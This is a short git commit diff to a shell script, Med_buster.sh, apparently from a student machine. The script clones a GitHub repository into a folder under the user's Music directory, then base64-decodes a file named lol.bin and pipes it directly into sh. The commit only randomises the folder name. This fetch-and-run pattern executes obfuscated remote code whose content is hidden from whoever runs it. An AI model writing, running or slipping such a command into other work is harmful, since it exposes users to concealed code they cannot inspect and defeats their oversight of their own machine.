f67706395ad930d664eca628b157fc881ac1c3da
Sarah Hicham Meftah <hmeftah@c1r6p5.1337.ma>
2023-03-13 13:17:18 +0100

    Failsafe

--- Med_buster.sh
+++ Med_buster.sh
@@ -1,3 +1,4 @@
+random=$RANDOM
 
-git clone https://github.com/SilentSarah/Med_buster /Users/$USER/Music/lkwa
-base64 -d /Users/$USER/Music/lkwa/lol.bin | sh
+git clone https://github.com/SilentSarah/Med_buster /Users/$USER/Music/lkwa${random}
+base64 -d /Users/$USER/Music/lkwa${random}/lol.bin | sh
